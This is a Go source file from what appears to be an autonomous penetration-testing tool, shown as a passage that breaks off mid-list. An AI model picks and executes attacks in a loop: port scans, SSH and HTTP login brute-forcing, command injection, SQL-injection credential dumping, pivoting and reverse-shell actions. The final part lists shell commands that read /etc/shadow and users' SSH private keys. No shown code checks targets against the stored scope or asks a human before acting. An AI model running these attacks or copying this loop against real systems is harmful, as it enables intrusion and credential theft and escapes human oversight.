package ai

import (
	"bufio"
	"context"
	"database/sql"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	"pentestai/internal/exploit"
	"pentestai/internal/recon"
	"pentestai/internal/webapp"
)

// AutoRunner executes autonomous penetration tests
type AutoRunner struct {
	ai         *AutoPentester
	scanner    *recon.Scanner
	webScanner *webapp.WebScanner
	framework  *exploit.Framework
	state      *PentestState
	report     *PentestReport
	callbacks  RunnerCallbacks
	running    bool
	maxActions int
}

type RunnerCallbacks struct {
	OnActionStart  func(action string, target string)
	OnActionEnd    func(action string, success bool, output string)
	OnFinding      func(finding Finding)
	OnCredential   func(cred CredentialFind)
	OnPhaseChange  func(phase string)
	OnComplete     func(report *PentestReport)
	OnError        func(err error)
	OnAIDecision   func(decision *AIDecision)
}

func NewAutoRunner(client *ClaudeClient) *AutoRunner {
	return &AutoRunner{
		ai:         NewAutoPentester(client),
		scanner:    recon.NewScanner(),
		webScanner: webapp.NewWebScanner(),
		framework:  exploit.NewFramework(),
		state: &PentestState{
			Phase: "initialization",
		},
		maxActions: 100, // Default max actions
	}
}

func (r *AutoRunner) SetMaxActions(max int) {
	r.maxActions = max
}

// GetReport returns the last generated report
func (r *AutoRunner) GetReport() *PentestReport {
	return r.report
}

// GetState returns the current pentest state
func (r *AutoRunner) GetState() *PentestState {
	return r.state
}

// getOpt safely extracts string option from interface map
func getOpt(opts map[string]interface{}, key string) string {
	if opts == nil {
		return ""
	}
	if v, ok := opts[key]; ok {
		switch val := v.(type) {
		case string:
			return val
		case float64:
			return strconv.Itoa(int(val))
		case int:
			return strconv.Itoa(val)
		case bool:
			if val {
				return "true"
			}
			return "false"
		default:
			return fmt.Sprintf("%v", v)
		}
	}
	return ""
}

// extractHost extracts just the hostname from a target string (removes protocol, port, path)
func extractHost(target string) string {
	t := target
	t = strings.TrimPrefix(t, "http://")
	t = strings.TrimPrefix(t, "https://")
	if idx := strings.Index(t, "/"); idx > 0 {
		t = t[:idx]
	}
	if idx := strings.Index(t, ":"); idx > 0 {
		t = t[:idx]
	}
	return t
}

// extractHostAndPort extracts host and port from target string (e.g., "127.0.0.1:8080" -> "127.0.0.1", 8080)
func extractHostAndPort(target string) (string, int) {
	t := target
	t = strings.TrimPrefix(t, "http://")
	t = strings.TrimPrefix(t, "https://")
	if idx := strings.Index(t, "/"); idx > 0 {
		t = t[:idx]
	}

	host := t
	port := 0
	if idx := strings.LastIndex(t, ":"); idx > 0 {
		host = t[:idx]
		if p, err := strconv.Atoi(t[idx+1:]); err == nil {
			port = p
		}
	}
	return host, port
}

func (r *AutoRunner) SetCallbacks(cb RunnerCallbacks) {
	r.callbacks = cb
}

// Run starts an autonomous pentest against the target
func (r *AutoRunner) Run(ctx context.Context, target string, scope []string) (*PentestState, error) {
	r.state.Target = target
	r.state.Scope = scope
	r.state.Phase = "reconnaissance"
	r.running = true

	if r.callbacks.OnPhaseChange != nil {
		r.callbacks.OnPhaseChange("reconnaissance")
	}

	actionCount := 0

	for r.running && actionCount < r.maxActions {
		select {
		case <-ctx.Done():
			r.running = false
			break
		default:
		}

		// Get next action from AI
		decision, err := r.ai.GetNextAction(ctx, r.state)
		if err != nil {
			if r.callbacks.OnError != nil {
				r.callbacks.OnError(err)
			}
			continue
		}

		if r.callbacks.OnAIDecision != nil {
			r.callbacks.OnAIDecision(decision)
		}

		// Check for completion
		if decision.Action == "complete" || decision.Action == "report" {
			r.state.Phase = "reporting"
			if r.callbacks.OnPhaseChange != nil {
				r.callbacks.OnPhaseChange("reporting")
			}
			break
		}

		// Execute the action
		if r.callbacks.OnActionStart != nil {
			r.callbacks.OnActionStart(decision.Action, decision.Target)
		}

		action, err := r.executeAction(ctx, decision)
		if err != nil {
			if r.callbacks.OnError != nil {
				r.callbacks.OnError(err)
			}
		}

		if action != nil {
			r.state.ActionHistory = append(r.state.ActionHistory, *action)

			if r.callbacks.OnActionEnd != nil {
				r.callbacks.OnActionEnd(action.Type, action.Success, action.Result)
			}
		}

		actionCount++

		// Update phase based on progress
		r.updatePhase()
	}

	// Generate final report
	report, err := r.ai.GenerateReport(ctx, r.state)
	if err != nil {
		return r.state, err
	}

	// Store report for later retrieval
	r.report = report

	if r.callbacks.OnComplete != nil {
		r.callbacks.OnComplete(report)
	}

	return r.state, nil
}

func (r *AutoRunner) Stop() {
	r.running = false
}

func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*Action, error) {
	action := &Action{
		Type:      decision.Action,
		Target:    decision.Target,
		Module:    decision.Module,
		Options:   decision.Options,
		Timestamp: time.Now(),
		Data:      make(map[string]interface{}),
	}

	switch decision.Action {
	case "scan_ports":
		return r.actionScanPorts(ctx, action, decision)
	case "scan_network":
		return r.actionScanNetwork(ctx, action, decision)
	case "service_scan":
		return r.actionServiceScan(ctx, action, decision)
	case "web_scan":
		return r.actionWebScan(ctx, action, decision)
	case "dir_scan":
		return r.actionDirScan(ctx, action, decision)
	case "ssh_login":
		return r.actionSSHLogin(ctx, action, decision)
	case "ssh_exec":
		return r.actionSSHExec(ctx, action, decision)
	case "ftp_login":
		return r.actionFTPLogin(ctx, action, decision)
	case "ftp_anon":
		return r.actionFTPAnon(ctx, action, decision)
	case "http_login":
		return r.actionHTTPLogin(ctx, action, decision)
	case "redis_check":
		return r.actionRedisCheck(ctx, action, decision)
	case "cmd_inject":
		return r.actionCmdInject(ctx, action, decision)
	case "sqli_exploit":
		return r.actionSQLiExploit(ctx, action, decision)
	case "full_scan":
		return r.actionFullScan(ctx, action, decision)
	case "ssh_recon":
		return r.actionSSHRecon(ctx, action, decision)
	case "ssh_pivot":
		return r.actionSSHPivot(ctx, action, decision)
	case "pivot_scan":
		return r.actionPivotScan(ctx, action, decision)
	case "reverse_shell":
		return r.actionReverseShell(ctx, action, decision)
	case "cred_spray":
		return r.actionCredSpray(ctx, action, decision)
	case "lfi_exploit":
		return r.actionLFI(ctx, action, decision)
	case "ssrf_exploit":
		return r.actionSSRF(ctx, action, decision)
	case "file_upload":
		return r.actionFileUpload(ctx, action, decision)
	case "nuclei_scan":
		return r.actionNucleiScan(ctx, action, decision)
	case "xss_scan":
		return r.actionXSSScan(ctx, action, decision)
	case "nikto_scan":
		return r.actionNiktoScan(ctx, action, decision)
	case "subdomain_enum":
		return r.actionSubdomainEnum(ctx, action, decision)
	case "ssl_scan":
		return r.actionSSLScan(ctx, action, decision)
	case "ssl_connect":
		return r.actionSSLConnect(ctx, action, decision)
	case "api_fuzz":
		return r.actionAPIFuzz(ctx, action, decision)
	case "crack_hash":
		return r.actionCrackHash(ctx, action, decision)
	case "mysql_check":
		return r.actionMySQLCheck(ctx, action, decision)
	case "mongodb_check":
		return r.actionMongoDBCheck(ctx, action, decision)
	case "postgres_check":
		return r.actionPostgresCheck(ctx, action, decision)
	case "xmlrpc_exploit":
		return r.actionXMLRPCExploit(ctx, action, decision)
	case "jsonrpc_exploit":
		return r.actionJSONRPCExploit(ctx, action, decision)
	case "rmi_exploit":
		return r.actionRMIExploit(ctx, action, decision)
	case "rpcbind_scan":
		return r.actionRPCBindScan(ctx, action, decision)
	case "nfs_exploit":
		return r.actionNFSExploit(ctx, action, decision)
	case "grpc_exploit":
		return r.actionGRPCExploit(ctx, action, decision)
	case "msrpc_scan":
		return r.actionMSRPCScan(ctx, action, decision)
	// New curious modules
	case "dir_bruteforce":
		return r.actionDirBruteforce(ctx, action, decision)
	case "sqli", "sqli_test":
		return r.actionSQLiTest(ctx, action, decision)
	case "lfi_test", "lfi":
		return r.actionLFITest(ctx, action, decision)
	case "ldap_check", "check_ldap":
		return r.actionLDAPCheck(ctx, action, decision)
	case "snmp_check", "check_snmp":
		return r.actionSNMPCheck(ctx, action, decision)
	case "subdomain_scan":
		return r.actionSubdomainScan(ctx, action, decision)
	case "dns_zone_transfer":
		return r.actionDNSZoneTransfer(ctx, action, decision)
	case "banner_grab":
		return r.actionBannerGrab(ctx, action, decision)
	default:
		action.Result = fmt.Sprintf("Unknown action: %s", decision.Action)
		action.Success = false
	}

	return action, nil
}

func (r *AutoRunner) actionScanPorts(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	ports := recon.TopPorts(100)
	if p := getOpt(decision.Options, "ports"); p != "" {
		ports = parsePorts(p)
	}

	opts := recon.ScanOptions{
		Ports:       ports,
		BannerGrab:  true,
		ServiceScan: true,
	}

	host, err := r.scanner.ScanHost(ctx, target, opts)
	if err != nil {
		action.Result = fmt.Sprintf("Scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Update state with discovered ports
	for _, port := range host.Ports {
		if port.State == "open" {
			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
				Host:     target,
				Port:     port.Number,
				Protocol: port.Protocol,
				State:    port.State,
			})

			r.state.Services = append(r.state.Services, ServiceInfo{
				Host:    target,
				Port:    port.Number,
				Name:    port.Service.Name,
				Product: port.Service.Product,
				Version: port.Service.Version,
				Banner:  port.Banner,
			})
		}
	}

	// Add host to discovered hosts
	r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
		IP:       host.IP,
		Hostname: host.Hostname,
		Status:   host.State,
	})

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Scanned %s - %d open ports found\n", target, len(host.Ports)))
	for _, port := range host.Ports {
		if port.State == "open" {
			sb.WriteString(fmt.Sprintf("  %d/%s - %s", port.Number, port.Protocol, port.Service.Name))
			if port.Service.Product != "" {
				sb.WriteString(fmt.Sprintf(" (%s %s)", port.Service.Product, port.Service.Version))
			}
			sb.WriteString("\n")
		}
	}

	action.Result = sb.String()
	action.Success = len(host.Ports) > 0
	action.Data["host"] = host

	return action, nil
}

func (r *AutoRunner) actionScanNetwork(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	cidr := getOpt(decision.Options, "cidr")
	if cidr == "" {
		cidr = decision.Target
	}

	hosts, err := r.scanner.PingSweep(ctx, cidr)
	if err != nil {
		action.Result = fmt.Sprintf("Network scan failed: %v", err)
		action.Success = false
		return action, err
	}

	for _, ip := range hosts {
		r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
			IP:     ip,
			Status: "up",
		})
	}

	action.Result = fmt.Sprintf("Discovered %d live hosts: %s", len(hosts), strings.Join(hosts, ", "))
	action.Success = len(hosts) > 0
	action.Data["hosts"] = hosts

	return action, nil
}

func (r *AutoRunner) actionServiceScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	// Parse port from target if format is host:port
	port := 0
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port, _ = strconv.Atoi(parts[1])
	}
	if port == 0 {
		port, _ = strconv.Atoi(getOpt(decision.Options, "port"))
	}

	opts := recon.ScanOptions{
		Ports:       []int{port},
		BannerGrab:  true,
		ServiceScan: true,
	}

	host, err := r.scanner.ScanHost(ctx, target, opts)
	if err != nil {
		action.Result = fmt.Sprintf("Service scan failed: %v", err)
		action.Success = false
		return action, err
	}

	if len(host.Ports) > 0 {
		p := host.Ports[0]
		action.Result = fmt.Sprintf("Service on %s:%d - %s %s %s\nBanner: %s",
			target, port, p.Service.Name, p.Service.Product, p.Service.Version, p.Banner)
		action.Success = true

		// Update state
		for i, svc := range r.state.Services {
			if svc.Host == target && svc.Port == port {
				r.state.Services[i].Product = p.Service.Product
				r.state.Services[i].Version = p.Service.Version
				r.state.Services[i].Banner = p.Banner
				break
			}
		}
	} else {
		action.Result = "No service information retrieved"
		action.Success = false
	}

	return action, nil
}

func (r *AutoRunner) actionWebScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	url := decision.Target
	if !strings.HasPrefix(url, "http") {
		url = "http://" + url
	}

	result, err := r.webScanner.Scan(ctx, url)
	if err != nil {
		action.Result = fmt.Sprintf("Web scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add findings to state
	for _, finding := range result.Findings {
		f := Finding{
			Type:        finding.Type,
			Severity:    finding.Severity,
			Target:      url,
			Description: finding.Description,
			Evidence:    finding.Evidence,
			Remediation: finding.Remediation,
			Timestamp:   time.Now(),
		}
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, f)

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(f)
		}
	}

	action.Result = result.FormatResult()
	action.Success = true
	action.Data["findings"] = result.Findings
	action.Data["technologies"] = result.Technologies

	return action, nil
}

func (r *AutoRunner) actionDirScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/dir_scanner"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse URL to get host and port
	target := decision.Target
	port := "80"
	ssl := "false"

	if strings.HasPrefix(target, "https://") {
		ssl = "true"
		port = "443"
		target = strings.TrimPrefix(target, "https://")
	} else {
		target = strings.TrimPrefix(target, "http://")
	}

	if idx := strings.Index(target, ":"); idx != -1 {
		port = target[idx+1:]
		if slashIdx := strings.Index(port, "/"); slashIdx != -1 {
			port = port[:slashIdx]
		}
		target = target[:idx]
	} else if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)
	module.SetOption("SSL", ssl)

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Dir scan failed: %v", err)
		action.Success = false
		return action, err
	}

	action.Result = result.Output
	action.Success = result.Success
	action.Data["found_paths"] = result.Data["found_paths"]

	return action, nil
}

func (r *AutoRunner) actionSSHLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ssh/ssh_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target - could be "ip:port" format
	target := decision.Target
	port := "22" // default

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	// Override port if explicitly set in options
	if p := getOpt(decision.Options, "port"); p != "" {
		module.SetOption("RPORT", p)
	}
	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}
	if userFile := getOpt(decision.Options, "user_file"); userFile != "" {
		module.SetOption("USER_FILE", userFile)
	}
	if passFile := getOpt(decision.Options, "pass_file"); passFile != "" {
		module.SetOption("PASS_FILE", passFile)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSH login failed: %v", err)
		action.Success = false
		return action, err
	}

	// Add found credentials to state
	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "ssh",
			Target:   fmt.Sprintf("%s:%s", target, port),
		}
		r.state.Credentials = append(r.state.Credentials, cf)

		if r.callbacks.OnCredential != nil {
			r.callbacks.OnCredential(cf)
		}
	}

	action.Result = result.Output
	if result.Output == "" && result.Success {
		action.Result = fmt.Sprintf("SSH credentials found on %s:%s", target, port)
	} else if result.Output == "" {
		action.Result = fmt.Sprintf("No valid SSH credentials found on %s:%s", target, port)
	}
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionSSHExec(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}
	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}
	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SSH exec failed: %v", err)
		action.Success = false
		return action, err
	}

	action.Result = result.Output
	action.Success = result.Success

	// Add session if successful
	if result.Success {
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("ssh-%d", len(r.state.Sessions)+1),
			Type:   "ssh",
			Target: decision.Target,
			User:   getOpt(decision.Options, "username"),
		})
	}

	return action, nil
}

func (r *AutoRunner) actionFTPAnon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/ftp/anonymous"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("FTP anon check failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "anonymous_ftp",
			Severity:    "medium",
			Target:      decision.Target,
			Description: "Anonymous FTP access enabled",
			Remediation: "Disable anonymous FTP access",
			Timestamp:   time.Now(),
		})
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionHTTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/http/http_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse URL
	target := decision.Target
	port := "80"
	if strings.HasPrefix(target, "https://") {
		module.SetOption("SSL", "true")
		port = "443"
		target = strings.TrimPrefix(target, "https://")
	} else {
		target = strings.TrimPrefix(target, "http://")
	}

	if idx := strings.Index(target, ":"); idx != -1 {
		port = target[idx+1:]
		target = target[:idx]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if user := getOpt(decision.Options, "username"); user != "" {
		module.SetOption("USERNAME", user)
	}
	if pass := getOpt(decision.Options, "password"); pass != "" {
		module.SetOption("PASSWORD", pass)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("HTTP login failed: %v", err)
		action.Success = false
		return action, err
	}

	for _, cred := range result.Credentials {
		cf := CredentialFind{
			Username: cred.Username,
			Password: cred.Password,
			Service:  "http",
			Target:   decision.Target,
		}
		r.state.Credentials = append(r.state.Credentials, cf)
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionRedisCheck(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("auxiliary/scanner/redis/redis_login"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()
	module.SetOption("RHOSTS", decision.Target)

	if port := getOpt(decision.Options, "port"); port != "" {
		module.SetOption("RPORT", port)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Redis check failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		// Build evidence from Redis data
		var evidence strings.Builder
		evidence.WriteString("Redis Unauthenticated Access\n")
		evidence.WriteString(fmt.Sprintf("Target: %s:6379\n", decision.Target))
		evidence.WriteString("Connection: SUCCESS (no password required)\n")

		if info, ok := result.Data["info"].(string); ok && info != "" {
			evidence.WriteString(fmt.Sprintf("\nRedis Server Info:\n%s\n", info))
		}
		if keys, ok := result.Data["keys"].([]string); ok && len(keys) > 0 {
			evidence.WriteString(fmt.Sprintf("\nExposed Keys (sample): %v\n", keys[:min(10, len(keys))]))
		}
		if dbsize, ok := result.Data["dbsize"].(int); ok {
			evidence.WriteString(fmt.Sprintf("Database Size: %d keys\n", dbsize))
		}

		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "redis_unauth",
			Severity:    "critical",
			Target:      decision.Target,
			Service:     "redis",
			Description: "Redis server accessible without authentication - allows full database access, potential data exfiltration, and RCE via EVAL",
			Evidence:    evidence.String(),
			Remediation: "Enable Redis authentication with requirepass directive. Bind to localhost only or use firewall rules. Consider using Redis ACLs for fine-grained access control.",
			Timestamp:   time.Now(),
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) updatePhase() {
	// Determine current phase based on progress
	hasHosts := len(r.state.DiscoveredHosts) > 0
	hasPorts := len(r.state.OpenPorts) > 0
	hasServices := len(r.state.Services) > 0
	hasVulns := len(r.state.Vulnerabilities) > 0
	hasCreds := len(r.state.Credentials) > 0
	hasSessions := len(r.state.Sessions) > 0

	newPhase := r.state.Phase

	if !hasHosts && !hasPorts {
		newPhase = "reconnaissance"
	} else if hasHosts && !hasServices {
		newPhase = "enumeration"
	} else if hasServices && !hasVulns && !hasCreds {
		newPhase = "vulnerability_assessment"
	} else if (hasVulns || hasCreds) && !hasSessions {
		newPhase = "exploitation"
	} else if hasSessions {
		newPhase = "post_exploitation"
	}

	if newPhase != r.state.Phase {
		r.state.Phase = newPhase
		if r.callbacks.OnPhaseChange != nil {
			r.callbacks.OnPhaseChange(newPhase)
		}
	}
}

func (r *AutoRunner) actionCmdInject(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/cmd_injection"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
		module.SetOption("SSL", "true")
		port = "443"
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
		module.SetOption("CMD", cmd)
	}
	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}
	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("Command injection failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "command_injection",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "OS Command Injection - Remote Code Execution achieved",
			Evidence:    result.Output,
			Remediation: "Sanitize user input, use parameterized commands, implement allowlist validation",
			Timestamp:   time.Now(),
		})

		// Add session if we got RCE
		r.state.Sessions = append(r.state.Sessions, SessionInfo{
			ID:     fmt.Sprintf("rce-%d", len(r.state.Sessions)+1),
			Type:   "web_rce",
			Target: decision.Target,
			User:   "www-data",
		})

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "command_injection",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "Command Injection RCE",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func (r *AutoRunner) actionSQLiExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/http/dvwa_sqli"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target URL
	target := decision.Target
	port := "80"

	if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		portPath := parts[1]
		if idx := strings.Index(portPath, "/"); idx != -1 {
			port = portPath[:idx]
		} else {
			port = portPath
		}
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	if cookie := getOpt(decision.Options, "cookie"); cookie != "" {
		module.SetOption("COOKIE", cookie)
	}
	if uri := getOpt(decision.Options, "uri"); uri != "" {
		module.SetOption("TARGETURI", uri)
	}

	result, err := module.Run(ctx)
	if err != nil {
		action.Result = fmt.Sprintf("SQLi exploit failed: %v", err)
		action.Success = false
		return action, err
	}

	if result.Success {
		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
			Type:        "sql_injection",
			Severity:    "critical",
			Target:      decision.Target,
			Description: "SQL Injection - Database access achieved",
			Evidence:    result.Output,
			Remediation: "Use parameterized queries/prepared statements, implement input validation",
			Timestamp:   time.Now(),
		})

		// Add any extracted credentials
		for _, cred := range result.Credentials {
			cf := CredentialFind{
				Username: cred.Username,
				Password: cred.Password,
				Service:  "sqli_dump",
				Target:   decision.Target,
			}
			r.state.Credentials = append(r.state.Credentials, cf)

			if r.callbacks.OnCredential != nil {
				r.callbacks.OnCredential(cf)
			}
		}

		if r.callbacks.OnFinding != nil {
			r.callbacks.OnFinding(Finding{
				Type:        "sql_injection",
				Severity:    "critical",
				Target:      decision.Target,
				Description: "SQL Injection vulnerability exploited",
			})
		}
	}

	action.Result = result.Output
	action.Success = result.Success

	return action, nil
}

func parsePorts(s string) []int {
	var ports []int
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			bounds := strings.Split(part, "-")
			if len(bounds) == 2 {
				start, _ := strconv.Atoi(bounds[0])
				end, _ := strconv.Atoi(bounds[1])
				for p := start; p <= end; p++ {
					ports = append(ports, p)
				}
			}
		} else {
			p, _ := strconv.Atoi(part)
			if p > 0 {
				ports = append(ports, p)
			}
		}
	}
	return ports
}

// actionFullScan scans all 65535 ports with high concurrency
func (r *AutoRunner) actionFullScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	target := decision.Target
	if target == "" {
		target = r.state.Target
	}

	host, err := r.scanner.FastFullScan(ctx, target)
	if err != nil {
		action.Result = fmt.Sprintf("Full scan failed: %v", err)
		action.Success = false
		return action, err
	}

	// Update state with discovered ports
	sshPorts := []int{}
	for _, port := range host.Ports {
		if port.State == "open" {
			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
				Host:     target,
				Port:     port.Number,
				Protocol: port.Protocol,
				State:    port.State,
			})

			r.state.Services = append(r.state.Services, ServiceInfo{
				Host:    target,
				Port:    port.Number,
				Name:    port.Service.Name,
				Product: port.Service.Product,
				Version: port.Service.Version,
			})

			// Track SSH ports
			if port.Service.Name == "ssh" {
				sshPorts = append(sshPorts, port.Number)
			}
		}
	}

	// Add host to discovered hosts
	r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
		IP:       host.IP,
		Hostname: host.Hostname,
		Status:   host.State,
	})

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Full scan of %s - %d open ports found\n", target, len(host.Ports)))

	// Highlight SSH services
	if len(sshPorts) > 0 {
		sb.WriteString(fmt.Sprintf("  [!] SSH services found on ports: %v\n", sshPorts))
	}

	for _, port := range host.Ports {
		if port.State == "open" {
			sb.WriteString(fmt.Sprintf("  %d/%s - %s", port.Number, port.Protocol, port.Service.Name))
			if port.Service.Product != "" {
				sb.WriteString(fmt.Sprintf(" (%s)", port.Service.Product))
			}
			sb.WriteString("\n")
		}
	}

	action.Result = sb.String()
	action.Success = len(host.Ports) > 0
	action.Data["host"] = host
	action.Data["ssh_ports"] = sshPorts

	return action, nil
}

// actionSSHRecon performs post-exploitation reconnaissance after SSH access
func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
		action.Result = fmt.Sprintf("Module error: %v", err)
		action.Success = false
		return action, err
	}

	module := r.framework.Current()

	// Parse target
	target := decision.Target
	port := "22"
	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		target = parts[0]
		port = parts[1]
	}

	module.SetOption("RHOSTS", target)
	module.SetOption("RPORT", port)

	username := getOpt(decision.Options, "username")
	password := getOpt(decision.Options, "password")

	// If no credentials provided, try to find them from state
	if username == "" || password == "" {
		targetKey := fmt.Sprintf("%s:%s", target, port)
		for _, cred := range r.state.Credentials {
			if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == target) {
				username = cred.Username
				password = cred.Password
				break
			}
		}
	}

	if username == "" || password == "" {
		action.Result = "SSH recon requires username and password - none found in state"
		action.Success = false
		return action, nil
	}

	module.SetOption("USERNAME", username)
	module.SetOption("PASSWORD", password)

	// List of recon commands to demonstrate impact
	reconCommands := []struct {
		cmd  string
		desc string
	}{
		{"id && whoami", "Current User Info"},
		{"uname -a", "System Information"},
		{"cat /etc/passwd | head -20", "User Accounts"},
		{"cat /etc/shadow 2>/dev/null | head -10 || echo 'No access to shadow'", "Password Hashes (if root)"},
		{"ls -la /home/", "Home Directories"},
		{"ls -la ~/.ssh/ 2>/dev/null || echo 'No .ssh directory'", "SSH Directory Contents"},
		{"cat ~/.ssh/id_rsa 2>/dev/null | head -30 || cat ~/.ssh/id_ed25519 2>/dev/null | head -30 || echo 'No SSH private key found'", "SSH Private Keys (CRITICAL!)"},
		{"cat ~/.ssh/authorized_keys 2>/dev/null || echo 'No authorized_keys'", "SSH Authorized Keys"},
